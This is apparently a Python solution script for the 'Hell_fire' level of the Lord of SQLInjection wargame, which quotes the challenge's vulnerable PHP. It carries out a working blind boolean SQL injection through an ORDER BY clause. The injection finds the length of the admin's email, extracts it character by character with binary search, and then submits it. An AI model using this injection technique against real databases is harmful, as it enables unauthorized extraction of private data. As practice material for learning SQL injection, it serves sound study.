#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return args[0].index('admin') < args[0].index('rubiya')


def main():
    '''
    Hell_fire 23

    if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
    $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
    echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
    $rows = mysqli_query($db,$query);
    while(($result = mysqli_fetch_array($rows))){
      if($result['id'] == "admin") $result['email'] = "**************";
      echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
    }
    echo "</table><hr>query : <strong>{$query}</strong><hr>";

    $_GET[email] = addslashes($_GET[email]);
    $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
    '''

    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
    max_key_len = 32
    cook = los.check_cookies(url)

    payload = "id='admin' and length(email)>%s desc"
    param = dict(order=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f"id='admin' and ord(mid(email,{i},1))<%s desc"
        param = dict(order=payload)
        left, num_requests = los.find_binary(url, param, check_func,
                                             32, 127, cook)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)

    param = dict(email=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Hell_fire Clear!')


if __name__ == '__main__':
    main()
